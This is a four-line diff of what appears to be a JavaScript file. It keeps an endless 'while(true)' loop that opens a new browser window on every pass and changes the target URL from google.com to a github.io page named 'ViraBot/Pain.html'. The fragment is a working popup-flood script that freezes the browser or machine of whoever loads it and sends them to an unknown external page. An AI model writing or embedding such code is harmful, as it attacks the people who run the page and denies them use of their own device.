@@ -1,4 +1,4 @@
 
 while(true){
-    window.open("https://www.google.com");
+    window.open("https://crookedtwig4.github.io/ViraBot/Pain.html");
 }
